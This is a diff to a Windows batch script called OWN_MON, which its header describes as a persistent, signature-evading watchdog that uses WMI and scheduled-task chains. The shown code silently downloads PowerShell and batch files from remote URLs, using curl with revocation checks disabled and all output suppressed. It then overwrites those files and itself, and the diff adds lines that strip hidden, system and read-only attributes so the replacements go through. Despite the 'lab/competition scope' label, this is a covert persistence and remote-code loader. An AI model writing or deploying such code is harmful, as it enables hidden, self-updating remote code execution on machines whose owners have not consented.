@@ -1,6 +1,6 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M10
+rem  OWN_MON  BUILD 20260802M11
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
 rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
 rem  Authorized internal deployment - lab/competition scope only.
@@ -57,12 +57,15 @@ rem ── [A] auto-update core files (best effort) ─────────�
 if not exist "%CURL%" set "CURL=curl.exe"
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG%" >nul 2>&1
 if not exist "%WD%\tg_report.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\tg_report.new" "%TG2%" >nul 2>&1
+attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
 for %%F in ("%WD%\tg_report.new") do if %%~zF GTR 1500 move /y "%WD%\tg_report.new" "%WD%\tg_report.ps1" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC%" >nul 2>&1
 if not exist "%WD%\own_secure.new" "%CURL%" -L --connect-timeout 8 --max-time 30 -o "%WD%\own_secure.new" "%OWNSEC2%" >nul 2>&1
+attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
 for %%F in ("%WD%\own_secure.new") do if %%~zF GTR 800 move /y "%WD%\own_secure.new" "%WD%\own_secure.cmd" >nul 2>&1
 "%CURL%" -L --ssl-no-revoke --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB%" >nul 2>&1
 if not exist "%WD%\own_lib.new" "%CURL%" -L --connect-timeout 8 --max-time 40 -o "%WD%\own_lib.new" "%OWNLIB2%" >nul 2>&1
+attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
 for %%F in ("%WD%\own_lib.new") do if %%~zF GTR 1500 move /y "%WD%\own_lib.new" "%WD%\own_lib.ps1" >nul 2>&1
 rem self-update: download new own_mon, apply AFTER this tick
 set "SELF_UPD=0"
@@ -204,6 +207,7 @@ if errorlevel 1 (
 rem ── [I] self-update apply (last thing this tick) ──────────────
 if "%SELF_UPD%"=="1" (
   echo self-update apply>>"%LOG%"
+  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
   move /y "%WD%\own_mon.next" "%WD%\own_mon.cmd" >nul 2>&1
 )
 
